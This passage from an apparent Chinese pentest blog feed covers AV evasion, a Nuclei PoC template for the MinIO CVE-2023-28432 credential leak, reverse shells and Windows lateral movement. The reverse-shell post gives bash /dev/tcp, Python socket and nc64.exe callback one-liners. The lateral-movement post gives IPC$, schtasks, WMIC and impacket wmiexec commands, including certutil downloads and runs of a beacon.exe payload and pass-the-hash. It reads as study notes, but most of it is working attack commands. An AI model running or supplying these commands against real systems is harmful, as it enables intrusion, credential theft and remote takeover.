class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$encrypted</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;e45e329feb5d925b&quot;</span>;</span><br><span class="line">    <span class="variable">$keyBytes</span> = <span class="title function_ invoke__">array_values</span>(<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;C*&#x27;</span>, <span class="variable">$key</span>)); <span class="comment">// 将密钥转为字节数组</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第一步：异或解密</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$encrypted</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$keyIndex</span> = (<span class="variable">$i</span> + <span class="number">1</span>) &amp; <span class="number">15</span>; <span class="comment">// 等同于 (i+1) % 16</span></span><br><span class="line">        <span class="variable">$decryptedByte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$encrypted</span>[<span class="variable">$i</span>]) ^ <span class="variable">$keyBytes</span>[<span class="variable">$keyIndex</span>];</span><br><span class="line">        <span class="variable">$data</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$decryptedByte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 第二步：ROT13解密</span></span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$byte</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="variable">$byte</span> &gt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) &amp;&amp; <span class="variable">$byte</span> &lt;= <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$byte</span> = ((<span class="variable">$byte</span> - <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="title function_ invoke__">ord</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$decrypted</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$byte</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20215027.png"><br>后构建项目，再构建工件生成jar文件<br>测试：<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-07%20215454.png"><br>其他加密算法：<br>参考此文章<br><a href="https://xz.aliyun.com/news/11899">https://xz.aliyun.com/news/11899</a></p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Poc开发-yml语法</title>
      <link href="/2025/06/17/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-yml%E8%AF%AD%E6%B3%95/"/>
      <url>/2025/06/17/%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0-yml%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="Poc开发-yml语法"><a href="#Poc开发-yml语法" class="headerlink" title="Poc开发-yml语法"></a>Poc开发-yml语法</h1><p>参考文章：<br><a href="https://docs.nuclei.sh/template-guide/introduction">https://docs.nuclei.sh/template-guide/introduction</a><br><a href="https://blog.csdn.net/qq_41315957/article/details/126594572">https://blog.csdn.net/qq_41315957/article/details/126594572</a><br><a href="https://blog.csdn.net/qq_41315957/article/details/126594670">https://blog.csdn.net/qq_41315957/article/details/126594670</a></p><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><ul><li>大小写敏感</li><li>使用缩进表示层级关系</li><li>缩进不允许使用 tab，只允许空格</li><li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li><li>#表示注释</li><li>: 号后面要加空格</li></ul><h2 id="Yaml-Poc模版："><a href="#Yaml-Poc模版：" class="headerlink" title="Yaml Poc模版："></a>Yaml Poc模版：</h2><p>1、编号 id</p><p>2、信息 info</p><p>3、请求 http file tcp等</p><p>4、匹配 matchers Interactsh</p><p>5、提取 extractors</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#漏洞的唯一标识符。如果满足了下面匹配器（matchers）中的规则，显示出的就是id的值。</span></span><br><span class="line"><span class="attr">id:</span> <span class="string">CVE-2023-28432</span></span><br><span class="line"><span class="comment">#info为描述信息，不是硬规定一定要有哪些。自己看着办要写哪些</span></span><br><span class="line"><span class="attr">info:</span></span><br><span class="line"><span class="comment">#漏洞的名称</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">CVE-2023-28432</span></span><br><span class="line"><span class="comment">#漏洞的作者或发现者</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">burp</span> <span class="string">suite</span></span><br><span class="line"><span class="comment">#漏洞的严重程度</span></span><br><span class="line">  <span class="attr">severity:</span> <span class="string">severity</span></span><br><span class="line"><span class="comment">#漏洞的详细描述。</span></span><br><span class="line">  <span class="attr">description:</span> <span class="string">|</span></span><br><span class="line"><span class="string">    MinIO 是在 GNU Affero 通用公共许可证 v3.0 下发布的高性能对象存储。</span></span><br><span class="line"><span class="string"></span><span class="comment">#漏洞的参考资料，可以是链接地址。</span></span><br><span class="line">  <span class="attr">reference:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">https://github.com/vulhub/vulhub/tree/master/minio/CVE-2023-28432</span></span><br><span class="line"><span class="comment">#漏洞的标签，用于分类和关联其他相关漏洞。也方便到时候整理归类到库里面去</span></span><br><span class="line">  <span class="attr">tags:</span> <span class="string">cve,2023</span></span><br><span class="line"><span class="comment">#描述了与该漏洞相关的HTTP请求匹配规则的列表。</span></span><br><span class="line"><span class="attr">http:</span></span><br><span class="line"><span class="comment"># &quot;raw&quot;字段通常指的是原始的HTTP请求字符串。</span></span><br><span class="line"><span class="comment">#使用表单数据时，可以使用form字段。如果你的请求数据是JSON格式的，可以使用json字段。</span></span><br><span class="line"><span class="comment">#对于 URL 编码的数据，可以使用 urlencoded 字段。如果需要模拟文件上传，可以使用 multipart 字段</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line"><span class="comment">#这里面要参考漏洞的触发信息是怎么样的，漏洞需要提交什么样的数据包就怎么编写这里面的内容</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        POST /minio/bootstrap/v1/verify HTTP/1.1</span></span><br><span class="line"><span class="string"></span><span class="comment">#&#123;&#123;Hostname&#125;&#125;是一个变量，不要写死。在你使用nuclei程序使用-target参数指定URL的时候会被填充到这里来</span></span><br><span class="line">        <span class="attr">Host:</span> &#123;&#123;<span class="string">Hostname</span>&#125;&#125;</span><br><span class="line">        <span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line">        <span class="attr">Accept:</span> <span class="string">*/*</span></span><br><span class="line">        <span class="attr">Accept-Language:</span> <span class="string">en-US;q=0.9,en;q=0.8</span></span><br><span class="line">        <span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Windows</span> <span class="string">NT</span> <span class="number">10.0</span><span class="string">;</span> <span class="string">Win64;</span> <span class="string">x64)</span> <span class="string">AppleWebKit/537.36</span> <span class="string">(KHTML,</span> <span class="string">like</span> <span class="string">Gecko)</span> <span class="string">Chrome/110.0.5481.178</span> <span class="string">Safari/537.36</span></span><br><span class="line">        <span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line">        <span class="attr">Cache-Control:</span> <span class="string">max-age=0</span></span><br><span class="line">        <span class="attr">Content-Type:</span> <span class="string">application/x-www-form-urlencoded</span></span><br><span class="line">        <span class="attr">Content-Length:</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#定义了匹配器的条件，表示所有的匹配器都必须满足。</span></span><br><span class="line">    <span class="attr">matchers-condition:</span> <span class="string">and</span></span><br><span class="line">    <span class="comment">#匹配器 漏洞条件的特征点写在里面</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line"><span class="comment">#匹配器的类型，用于在响应的特定位置寻找指定的关键字。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">word</span></span><br><span class="line"><span class="comment"># 指定要匹配的部分是响应的body部分。</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">body</span></span><br><span class="line"><span class="comment">#指定要匹配的关键字列表，如果在响应主体中找到了这些关键字，将认为漏洞存在。</span></span><br><span class="line">        <span class="attr">words:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&#x27;MINIO_ROOT_USER&#x27;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">&#x27;MINIO_ROOT_PASSWORD&#x27;</span></span><br><span class="line">      <span class="comment">#另一个匹配器类型，用于匹配响应的状态码。</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">status</span></span><br><span class="line"><span class="comment">#指定要匹配的状态码列表，如果响应的状态码为200（成功），将认为漏洞存在。</span></span><br><span class="line">        <span class="attr">status:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="number">200</span></span><br></pre></td></tr></table></figure><p>使用方式：nuclei.exe -t Your_YamlFile -target 目标地址</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞发现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞发现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础知识-反弹shell</title>
      <link href="/2025/06/17/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2025/06/17/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识-反弹shell"><a href="#基础知识-反弹shell" class="headerlink" title="基础知识-反弹shell"></a>基础知识-反弹shell</h1><p>常见渗透命令：</p><p><a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a></p><p>命令生成：</p><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p><p>Linux：wget curl python ruby perl java 等</p><p>Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32 等</p><p>反弹 shell 命令：</p><p><a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a></p><p>常见的：<br>linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 443    //监听443端口</span><br><span class="line"></span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/ip/443 0&gt;&amp;1      //linux</span><br><span class="line">Windows:</span><br></pre></td></tr></table></figure><p>python:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.32.130&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure><p>whindows</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc64.exe：https://github.com/vinsworldcom/NetCat64/releases</span><br><span class="line"></span><br><span class="line">powershell -c wget ip/nc64.exe -outfile \\programdata\\nc64.exe //通过漏洞上传nc64.exe</span><br><span class="line">\\programdata\\nc64.exe -e powershell ip 443</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>横向移动-1</title>
      <link href="/2025/06/17/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1/"/>
      <url>/2025/06/17/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1/</url>
      
        <content type="html"><![CDATA[<h1 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动-1"></a>横向移动-1</h1><h2 id="域外用户"><a href="#域外用户" class="headerlink" title="域外用户"></a>域外用户</h2><p>1,尝试提权（system）</p><p>2,获取域内用户（枚举）及凭据<br><a href="https://github.com/ropnop/kerbrute">https://github.com/ropnop/kerbrute</a></p><p>Minikatz<br><a href="https://github.com/ParrotSec/mimikatz">https://github.com/ParrotSec/mimikatz</a><br>当系统为win10或者2012R2以上，内存中默认禁止缓存明文密码<br>可通过修改注册表的方式进行抓取，但需要重启后重新登录1时才能抓取</p><p>windows 2012以上默认关闭了Wdigest，所以攻击者无法通过内存获取明文密码<br>针对以上情况，四种解决办法：<br>1，利用（PTH，PTK）等进行移动，不需要密码<br>2，利用其他服务协议（SMB&#x2F;WMI 等进行哈希移动）<br>3，利用注册表开启（wdigest auth）进行获取<br>4，利用工具或者第三方平台（HASHCAT进行破解获取）</p><h2 id="IPC域内移动"><a href="#IPC域内移动" class="headerlink" title="IPC域内移动"></a>IPC域内移动</h2><p>IPC是共享“命名管道”的资源，它是一个用于程序通讯的开放管道，通过提供一个可信的用户和密码，连接双方可以建立一个安全通道并通过这个通道交换加密数据，从而实现对远程计算机的访问。需要使用目标系统用户的账户密码，使用139，445端口<br>1，建立IPC链接到目标主机<br>2，拷贝要执行的命令脚本到目标主机<br>3，查看目标时间，创建计划任务（at，schtasks）定时执行拷贝到的脚本<br>4，删除IPC链接<br>建立失败原因：<br>1，目标主机不是NT或以上的操作系统<br>2，对方没有打开IPC$共享<br>3，对方未开启139，445端口，或者被防火请屏蔽<br>4，输出命令，账号密码有错误</p><h3 id="IPC-利用命令："><a href="#IPC-利用命令：" class="headerlink" title="IPC$利用命令："></a>IPC$利用命令：</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\server\ipc$ &quot;password&quot; /user:计算机名\username #工作组</span><br><span class="line"><span class="built_in">net</span> use \\server\ipc$ &quot;password&quot; /user:domain\username #域内</span><br><span class="line"><span class="built_in">dir</span> \\xx.xx.xx.xx\C$\   #查看文件</span><br><span class="line"><span class="built_in">copy</span> \\xx.xx.xx.xx\C$\<span class="number">1</span>.bat <span class="number">1</span>.bat #下载文件</span><br><span class="line"><span class="built_in">copy</span> <span class="number">1</span>.bat \\\\xx.xx.xx.xx\C$ #复制文件</span><br><span class="line"><span class="built_in">net</span> use \\xx.xx.xx.xx\C$\<span class="number">1</span>.bat /<span class="built_in">del</span> #删除IPC</span><br><span class="line"><span class="built_in">net</span> view xx.xx.xx.xx #查看对方共享</span><br></pre></td></tr></table></figure><p>域内用户权限：webadmin权限</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:计算机名\administrator</span><br><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:domain\username</span><br></pre></td></tr></table></figure><p>域外用户权限：administrator权限</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:计算机名\administrator</span><br><span class="line"><span class="built_in">net</span> use \\ip\ipc$ &quot;密码&quot; /user:domain\username</span><br></pre></td></tr></table></figure><h3 id="at-schtasks-计划任务配合"><a href="#at-schtasks-计划任务配合" class="headerlink" title="at &amp; schtasks 计划任务配合"></a>at &amp; schtasks 计划任务配合</h3><h4 id="1-at-Windows2012"><a href="#1-at-Windows2012" class="headerlink" title="1,at &lt; Windows2012"></a>1,at &lt; Windows2012</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> beacon,exe \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span>\c$ #拷贝执行文件到目标机器</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> <span class="number">15</span>:<span class="number">47</span> c:\beacon.exe #添加计划任务</span><br></pre></td></tr></table></figure><h4 id="2-schtasks-Windows2012"><a href="#2-schtasks-Windows2012" class="headerlink" title="2,schtasks &gt;&#x3D;Windows2012"></a>2,schtasks &gt;&#x3D;Windows2012</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> beacon,exe \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>\c$ #拷贝执行文件到目标机器</span><br><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">22</span> /ru &quot;SYSTEM&quot; /tn beacon /sc DAILT /tr c:\beacon.exe /F # 创建beacon任务对应执行文件</span><br><span class="line">schtasks /run /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span> /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span> /tn beacon /f #删除beacon任务</span><br></pre></td></tr></table></figure><h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a><br>atexec.py连接（Socks代理下）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py ./administrator:密码@IP &quot;ver&quot;</span><br><span class="line">python atexec.py -hashes : 密码hash ./administrator@IP &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><p>从win2003开启一直存在，它原本的作用是方便管理员对windows主机进行管理。因此在内网渗透中，我们可以使用WMI进行横向移动，支持用户明文或者hash的方式进行认证，并且该方式不会在目标日志系统留下痕迹<br>利用条件：<br>1，WMI服务开启，端口135，默认开启<br>2，防火请运行135，445等端口通信<br>3，知道目标机的账户密码或HASH<br><strong>利用：</strong></p><h3 id="1-wmic"><a href="#1-wmic" class="headerlink" title="1.wmic"></a>1.wmic</h3><p>使用目标系统的cmd.exe执行一条命令，将执行结果保存在C盘的ip.txt文件中，</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIC /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">130</span> /user:test\administrator /password:admin123! Process <span class="keyword">Call</span> Create &quot;<span class="built_in">cmd</span>.exe /c <span class="built_in">ipconfig</span> &gt;c:\ip.txt&quot;</span><br></pre></td></tr></table></figure><p>建立ipc$后，使用type命令读取执行结果，具体如下</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span>\ipc$ &quot;Admin!@#$<span class="number">4321</span>&quot; /user:administrator</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span>\C$\ip.txt</span><br></pre></td></tr></table></figure><p>或者上传后门文件                                                </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WMIC /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">130</span> /user:test\administrator /password:admin123! Process <span class="keyword">Call</span> Create &quot;certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe c:/beacon.exe&quot;</span><br><span class="line">WMIC /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">130</span> /user:test\administrator /password:admin123! Process <span class="keyword">Call</span> Create &quot;c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p><strong>impacket工具包中的wmiexec</strong><br>Impacket-windows工具包下载地址：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe hacke/administrator:Admin!@#$4321@192<span class="number">.168</span><span class="number">.1</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><p>或者wmiexec.py文件</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> wmicexec.py test/administrator:admin!@#123@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span></span><br><span class="line"><span class="keyword">python</span> wmicexec.py test/administrator:admin!@#123@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="keyword">python</span> wmicexec.py -hashes :<span class="number">517</span>b96ad4178a5369dc997aa02d455c test/administrator@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p>下载后门</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py test/admininstrator:admin!@<span class="number">123</span>@<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">32</span> &quot;certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p>执行后门</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> wmiexec.py test/admininstrator:admin!@123@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span> <span class="string">&quot;c:/beacon.exe&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-cscript（没啥用）"><a href="#2-cscript（没啥用）" class="headerlink" title="2.cscript（没啥用）"></a>2.cscript（没啥用）</h3><p>Wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec功能。wmiexec.vbs可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell</p><p>下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a> 这里有个坑，不能直接用wget下载，需要直接把代码复制下来编辑成.vbs文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、半交互模式</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip username password</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator Admin!@#$<span class="number">4321</span></span><br><span class="line"><span class="number">2</span>、单命令执行</span><br><span class="line">cscript.exe wmiexec.vbs /<span class="built_in">cmd</span> ip username password &quot;command&quot;</span><br><span class="line">cscript.exe wmiexec.vbs /<span class="built_in">cmd</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator Admin!@#$<span class="number">4321</span> &quot;<span class="built_in">ipconfig</span>&quot;</span><br><span class="line"><span class="number">3</span>、wce_hash注入</span><br><span class="line">如果抓取的LM hash是AAD3开头的，或者是No Password之类的，就用<span class="number">32</span>个<span class="number">0</span>代替LM hash</span><br><span class="line">wce -s hash</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip</span><br></pre></td></tr></table></figure><p>获得一个半交互模式shell</p><h3 id="3-Invoke-WmiCommand"><a href="#3-Invoke-WmiCommand" class="headerlink" title="3.Invoke-WmiCommand"></a>3.Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1脚本包含在PowerSploit工具包很难过。该脚本主要通过powershell调用WMI来远程执行命令，本质还是在利用WMIs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//目标系统用户名</span><br><span class="line"><span class="variable">$User</span> = <span class="string">&quot;hacke\administrator&quot;</span></span><br><span class="line">//目标系统密码</span><br><span class="line"><span class="variable">$Password</span>= <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-String</span> <span class="string">&quot;Admin!@#<span class="variable">$4321</span>&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">//将账号和密码整合起来，以便导入Credential</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCreadential <span class="literal">-ArgumentList</span> <span class="variable">$User</span> , <span class="variable">$Password</span></span><br><span class="line">//远程执行命令</span><br><span class="line"><span class="variable">$Rmote</span>=<span class="built_in">Invoke-WmiCommand</span> <span class="literal">-payload</span> &#123;ipconfig&#125; <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">//将执行结果输出到屏幕上</span><br><span class="line"><span 